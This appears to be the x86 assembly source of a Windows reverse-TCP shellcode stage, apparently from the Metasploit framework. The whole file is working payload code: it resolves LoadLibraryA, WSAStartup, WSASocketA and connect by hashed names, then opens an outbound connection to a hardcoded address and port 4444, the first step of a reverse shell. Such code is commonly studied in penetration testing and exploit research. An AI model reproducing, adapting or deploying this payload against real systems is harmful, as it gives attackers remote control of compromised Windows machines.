;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (24 July 2009)
;-----------------------------------------------------------------------------;
[BITS 32]

; Input: EBP must be the address of 'api_call'.
; Output: EDI will be the socket for the connection to the server
; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

reverse_tcp:
  push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
  push 0x5F327377        ; ...
  push esp               ; Push a pointer to the "ws2_32" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "ws2_32" )
  
  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
  sub esp, eax           ; alloc some space for the WSAData structure
  push esp               ; push a pointer to this stuct
  push eax               ; push the wVersionRequested parameter
  push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
  call ebp               ; WSAStartup( 0x0190, &WSAData );
  
  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.
  push eax               ; push null for reserved parameter
  push eax               ; we do not specify a WSAPROTOCOL_INFO structure
  push eax               ; we do not specify a protocol
  inc eax                ;
  push eax               ; push SOCK_STREAM
  inc eax                ;
  push eax               ; push AF_INET
  push 0xE0DF0FEA        ; hash( "ws2_32.dll", "WSASocketA" )
  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
  mov edi, eax           ; save the socket for later
  
  push 0x0100007F        ; host 127.0.0.1
  push 0x5C110002        ; family AF_INET and port 4444
  mov esi, esp           ; save pointer to sockaddr struct
  push byte 16           ; length of the sockaddr struct
  push esi               ; pointer to the sockaddr struct
  push edi               ; the socket
  push 0x6174A599        ; hash( "ws2_32.dll", "connect" )
  call ebp               ; connect( s, &sockaddr, 16 );